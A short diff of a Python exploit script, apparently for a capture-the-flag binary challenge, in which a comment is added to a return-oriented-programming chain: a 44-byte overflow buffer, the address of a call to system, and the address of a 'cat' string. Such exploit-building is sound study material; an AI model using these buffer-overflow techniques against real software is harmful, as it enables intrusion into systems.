@@ -93,7 +93,7 @@ def little_endian(number):
 
 # Parts of the chain
 fill_buffer           = b"X"*44
-call_system_CODE_ADDR = 0x0804861a
+call_system_CODE_ADDR = 0x0804861a # The address of the command that calls the `system` function. Don't confuse it with the concept of a "system call".
 cat_STRING_ADDR       = 0x0804a030
 
 # Building the chain
